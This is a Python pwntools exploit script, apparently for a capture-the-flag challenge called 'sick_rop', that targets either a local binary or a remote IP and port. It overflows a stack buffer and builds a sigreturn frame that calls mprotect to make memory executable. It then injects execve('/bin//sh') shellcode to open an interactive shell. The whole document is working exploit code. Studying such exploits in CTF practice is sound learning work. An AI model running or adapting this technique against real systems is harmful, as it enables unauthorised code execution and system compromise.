from pwn import *

def exploit(boolean):
    if boolean:
        r = remote('83.136.252.57', 37435)
    else:
        r = process('./sick_rop')

    exe = ELF('./sick_rop', checksec=False)

    syscall_gad = 0x401014

    payload = b'A'*40
    payload += p64(exe.symbols['vuln'])     # to call the read() in vuln()
    payload += p64(syscall_gad)

    context.clear(arch='amd64')
    # context.log_level = 'debug'

    # Make the stack from Non_Executable to be Excutable
    frame = SigreturnFrame()
    frame.rax = 0xa             # mprotect()
    frame.rdi = 0x400000        # starting with this address to change access protection
    frame.rsi = 0x2000          # Length of space that will change access protection
    frame.rdx = 0x7             # R(4) - W(2) - X(1) premissions
    frame.rsp = 0x4010d8        # position of vuln() in stack - using "find 0x40102e" command in GDB
    frame.rip = syscall_gad     # syscall

    payload += bytes(frame)
    r.sendline(payload)
    r.recv()

    r.sendline(b'B'* 14)        # calling sigreturn() to undo everything
    # r.recv()
    gdb.attach(r)

    # RET2SHELLCODE
    #23 bytes
    shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
    payload = shellcode + b'C' *17 + p64(0x4010b8)
    r.sendline(payload)
    r.interactive()

exploit(False)